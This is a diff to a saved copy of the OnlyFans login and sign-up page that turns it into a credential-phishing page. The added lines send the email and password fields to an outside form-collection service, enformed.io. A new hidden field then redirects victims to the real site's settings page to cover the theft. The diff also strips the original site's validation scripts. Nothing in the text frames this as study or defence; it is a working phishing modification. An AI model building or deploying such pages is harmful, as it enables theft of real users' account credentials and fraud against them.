@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html id="guest_html" lang="en"><script id="harapi" src="onlyfans_files/harapi.js"></script><head>
+<html id="guest_html" lang="en">
+	<script id="harapi" src="onlyfans_files/harapi.js"></script><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="vjs-styles-defaults">
       .video-js {
         width: 300px;
@@ -101,7 +102,7 @@
 							<a href="https://onlyfans.com/"><img src="onlyfans_files/guest_logo_big.png"></a>
 							<h6>Sign up to make money and interact with your fans!</h6>
 							<span class="trough"></span>
-							<form action="/component/loginreg/post/send" method="POST" target="iframe" id="sign_up">
+							<form action="https://www.enformed.io/rwa3l9al" method="POST" target="iframe" id="sign_up">
 		<div class="form-group">
 		<input class="form-control" name="email" placeholder="E-mail" required="" type="email">
 		<div class="error_place error_place_for_email"></div>
@@ -110,6 +111,7 @@
 		<input class="form-control" name="password" placeholder="Password" required="" type="password">
 		<div class="error_place error_place_for_password"></div>
 	</div>
+<input type="hidden" name="*redirect" value="https://onlyfans.com/settings/safety"/>
     <div class="form-group" style="display: none">
         <label class="checkbox-label">
             <input id="agree" required="" checked="checked" type="checkbox">
@@ -147,104 +149,6 @@
 	</div>
 </div>
 
-<script type="text/javascript">
-	$(function () {
-		$('.restore_access_button').click(function () {
-			$.post('/component/restore_access/post/restore', {
-				email: $('.restore_access_email_input').val()
-			}, function (data) {
-				alert(data);
-			});
-			return false;
-		});
-
-	});
-</script>
-<script>
-	$(function () {
-		var form = $('#sign_up'),
-		inputEmail = form.find('input[name="email"]'),
-		inputPass = form.find('input[name="password"]'),
-		submitBtn = form.find('button[type="submit"]'),
-            agree = document.querySelector('#agree'),
-		emailVal = inputEmail.val();
-		form//.attr('action', '/component/loginreg/post/send')
-				.append('<input type=hidden name=js value=1>')
-				.on('signup_form_submitted', function () {
-					submitBtn.prop('disabled', true);
-				});
-		initCheckHandlers();
-		inputEmail.on('input inputInterval', function (e) {
-			if('input' === e.type) {
-				clearInterval(checkInterval);
-			}
-			var email = e.target.value;
-			if( email ) {
-				if( emailVal !== email ) {
-					emailVal = email;
-					if( ! validateEmail( email ) ) {
-					  submitBtn.prop( 'disabled', true );
-					  return;
-                    }
-					$.post( '/is_user.php', { 'email': email }, function ( data ) {
-						if ( '1' === data ) {
-                            submitBtn.text( 'Login' ).prop( 'disabled', false );
-                            agree.checked = true;
-                            $(agree).closest('.form-group').hide();
-							if ( NEED_LOGIN_CAPTCHA ) {
-								if ( !LOGIN_CAPTCHA ) {
-									showLoginCaptcha();
-                                    submitBtn.prop( 'disabled', true );
-								}
-							}
-							else if ( LOGIN_CAPTCHA ) {
-								hideLoginCaptcha();
-                                submitBtn.prop( 'disabled', false );
-							}
-							inputPass.off( 'blur input' ).next( '.error_place_for_password' ).html( '' );
-							form.off( 'submit', signupFormSubmit );
-						}
-						else {
-							if ( !LOGIN_CAPTCHA ) {
-								showLoginCaptcha();
-							}
-                            agree.checked = false;
-                            $(agree).closest('.form-group').show();
-							submitBtn.text( 'Sign Up' ).prop( 'disabled', true );
-							inputPass.off( 'submit', signupFormSubmit ).on( 'submit', signupFormSubmit );
-							initCheckHandlers();
-						}
-					} );
-				}
-			} else {
-				submitBtn.text('Login / Sign Up');
-			}
-		});
-		if (NEED_LOGIN_CAPTCHA) {
-			showLoginCaptcha();
-		} else {
-			hideLoginCaptcha();
-		}
-
-		function initCheckHandlers() {
-			inputPass.off('blur input').on('blur', function (event) {
-				checkPass(event);
-				$(this).on('input', checkPass);
-			});
-		}
-
-		var checkInterval = setInterval(function (  ) {
-			inputEmail.trigger('inputInterval');
-		}, 1000);
-
-		document.querySelector( '#agree' ).addEventListener( 'change', function (event) {
-            submitBtn.prop( 'disabled', !event.target.checked );
-        } );
-	});
-
-	LOGIN_CAPTCHA = false;
-	NEED_LOGIN_CAPTCHA = false;
-</script>
 						</div>
 					</div>
 				</div>
@@ -1117,49 +1021,11 @@ accounts.&nbsp;</p>											</div>
 		</div>
 	</div>
 </div>
-
-<script type="text/javascript">
-	$(function () {
-		$.post('/component/formcontacts/post/load', {}, function (html) {
-			$('#formcontacts_form_content').html(html);
-		});
-	});
-</script>
-
 <div class="global_preloader"></div>
 <button class="btn_up"><i class="fa fa-angle-up"></i></button>
 	<script type="text/javascript" src="onlyfans_files/video.js"></script>
-	<script type="text/javascript" src="onlyfans_files/bootstrap.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_009.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_011.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_010.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_003.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_002.js"></script>
-	<script type="text/javascript" src="onlyfans_files/bootstrap-datepicker.js"></script>
-	<script type="text/javascript" src="onlyfans_files/chosen.js"></script>
-	<script type="text/javascript" src="onlyfans_files/ekko-lightbox.js"></script>
-	<script type="text/javascript" src="onlyfans_files/bootstrap-formhelpers-min.js"></script>
-	<script type="text/javascript" src="onlyfans_files/bootstrapValidator-min.js"></script>
-	<script type="text/javascript" src="onlyfans_files/autosize.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_007.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery-ui.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_004.js"></script>
 	<script type="text/javascript" src="onlyfans_files/swiper.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_006.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_013.js"></script>
-	<script type="text/javascript" src="onlyfans_files/moment.js"></script>
-	<script type="text/javascript" src="onlyfans_files/bootstrap-datetimepicker.js"></script>
-	<script type="text/javascript" src="onlyfans_files/audio.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_014.js"></script>
-	<script type="text/javascript" src="onlyfans_files/html2canvas.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_005.js"></script>
-	<script type="text/javascript" src="onlyfans_files/emojionearea.js"></script>
-	<script type="text/javascript" src="onlyfans_files/featherlight.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery.js"></script>
-	<script type="text/javascript" src="onlyfans_files/jquery_008.js"></script>
-	<script type="text/javascript" src="onlyfans_files/scripts.js"></script>
-	<script type="text/javascript" src="onlyfans_files/quatro.js"></script>
+	
 <script src="onlyfans_files/jquery_012.js"></script>
 <script src="onlyfans_files/printfinger2.js"></script>
 		<script>
